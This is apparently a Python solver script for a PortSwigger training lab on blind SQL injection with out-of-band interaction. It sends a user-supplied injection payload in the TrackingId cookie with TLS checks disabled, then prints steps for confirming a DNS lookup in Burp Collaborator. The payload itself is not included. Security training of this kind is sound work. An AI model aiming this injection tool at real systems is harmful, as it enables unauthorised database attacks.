
#!/usr/bin/env python3
"""
Lab 15: Blind SQL injection with out-of-band interaction (OAST)

Official lab:
https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band

Usage:
    python3 lab-15-blind-sql-injection-with-out-of-band-interaction.py <URL> -p 127.0.0.1:8080 --payload-file payload.txt

    python3 lab-15-blind-sql-injection-with-out-of-band-interaction.py <URL> --payload "YOUR_TRACKINGID_PAYLOAD"
"""

import sys
import time
import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── ANSI colors ──────────────────────────────────────────────────────────────
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


def print_banner():
    banner = f"""
{CYAN}{BOLD}╔══════════════════════════════════════════════════════════════╗
║  Lab 15 – Blind SQL Injection (OAST Interaction)            ║
║  PortSwigger Web Security Academy                           ║
╚══════════════════════════════════════════════════════════════╝{RESET}
"""
    print(banner)


def build_proxies(proxy):
    """Build the requests proxy configuration."""
    if proxy:
        proxy_url = proxy if "://" in proxy else f"http://{proxy}"
        return {"http": proxy_url, "https": proxy_url}
    return {}


def get_session(url, proxy=None):
    """Visit the lab homepage and retrieve its session cookie."""
    proxies = build_proxies(proxy)

    try:
        response = requests.get(
            url,
            verify=False,
            proxies=proxies,
            timeout=15,
        )
        response.raise_for_status()

    except requests.exceptions.RequestException as error:
        print(f"{RED}[✗] Could not connect to the lab: {error}{RESET}")
        sys.exit(1)

    session_cookie = response.cookies.get("session")

    if not session_cookie:
        print(
            f"{YELLOW}[!] Session cookie was not found in the response. "
            f"Continuing without it may fail.{RESET}"
        )
    else:
        print(f"{GREEN}[✓] Session cookie retrieved.{RESET}")

    return session_cookie


def load_payload(payload=None, payload_file=None):
    """Load the TrackingId value from an argument or a text file."""
    if payload_file:
        try:
            with open(payload_file, "r", encoding="utf-8") as file:
                payload = file.read().strip()
        except OSError as error:
            print(f"{RED}[✗] Could not read payload file: {error}{RESET}")
            sys.exit(1)

    if not payload:
        print(f"{RED}[✗] No payload provided.{RESET}")
        sys.exit(1)

    # Allow either the complete cookie value or a value prefixed with TrackingId=
    if payload.lower().startswith("trackingid="):
        payload = payload.split("=", 1)[1].strip()

    if not payload:
        print(f"{RED}[✗] The payload is empty.{RESET}")
        sys.exit(1)

    return payload


def inject(url, payload, session_cookie=None, proxy=None):
    """Send one request with the supplied payload in the TrackingId cookie."""
    proxies = build_proxies(proxy)
    cookies = {"TrackingId": payload}

    if session_cookie:
        cookies["session"] = session_cookie

    try:
        start_time = time.perf_counter()

        response = requests.get(
            url,
            cookies=cookies,
            verify=False,
            proxies=proxies,
            timeout=20,
        )

        elapsed = time.perf_counter() - start_time

        print(f"{GREEN}[✓] HTTP request sent successfully.{RESET}")
        print(f"{CYAN}[*] HTTP status : {response.status_code}{RESET}")
        print(f"{CYAN}[*] Response size: {len(response.content)} bytes{RESET}")
        print(f"{CYAN}[*] Response time: {elapsed:.2f} seconds{RESET}")

        return response

    except requests.exceptions.RequestException as error:
        print(f"{RED}[✗] Request failed: {error}{RESET}")
        return None


def exploit(url, payload, proxy=None):
    """Send the OAST payload and explain how to verify the interaction."""
    print(f"{YELLOW}[*] Target  : {url}{RESET}")
    print(f"{YELLOW}[*] Proxy   : {proxy if proxy else 'disabled'}{RESET}")
    print(f"{YELLOW}[*] Payload : supplied via command line/file{RESET}\n")

    # Step 1 – Retrieve the current lab session
    print(f"{YELLOW}[*] Step 1: Getting lab session...{RESET}")
    session_cookie = get_session(url, proxy)

    # Step 2 – Send the payload
    print(f"\n{YELLOW}[*] Step 2: Sending OAST payload...{RESET}")
    response = inject(url, payload, session_cookie, proxy)

    if response is None:
        print(
            f"{RED}[✗] The request could not be completed. "
            f"Check the URL, proxy, and payload.{RESET}"
        )
        sys.exit(1)

    # Step 3 – Check the out-of-band interaction in Burp Collaborator
    print(f"\n{YELLOW}[*] Step 3: Verify the OAST interaction.{RESET}")
    print(f"{CYAN}    1. Open Burp Suite and go to Collaborator.{RESET}")
    print(f"{CYAN}    2. Use the same Collaborator payload domain as in your SQL payload.{RESET}")
    print(f"{CYAN}    3. Poll for interactions, if available in your Burp version.{RESET}")
    print(f"{CYAN}    4. Look for a DNS interaction from the lab.{RESET}")

    print(
        f"\n{YELLOW}[!] An HTTP response alone cannot confirm whether "
        f"the SQL query triggered a DNS lookup.{RESET}"
    )
    print(
        f"{GREEN}{BOLD}[*] Request completed. Confirm the interaction "
        f"in Collaborator and check the lab status.{RESET}"
    )


def main():
    parser = argparse.ArgumentParser(
        description="PortSwigger Lab 15 – Blind SQL injection with OAST interaction"
    )

    parser.add_argument(
        "url",
        help="Full URL of your active PortSwigger lab",
    )

    parser.add_argument(
        "-p", "--proxy",
        metavar="HOST:PORT",
        help="Optional proxy, e.g. 127.0.0.1:8080",
    )

    payload_group = parser.add_mutually_exclusive_group(required=True)

    payload_group.add_argument(
        "-d", "--payload",
        help="Complete TrackingId cookie value",
    )

    payload_group.add_argument(
        "--payload-file",
        metavar="FILE",
        help="Read the complete TrackingId cookie value from a file",
    )

    args = parser.parse_args()

    url = args.url.rstrip("/")
    payload = load_payload(args.payload, args.payload_file)

    print_banner()
    exploit(url, payload, proxy=args.proxy)


if __name__ == "__main__":
    main()
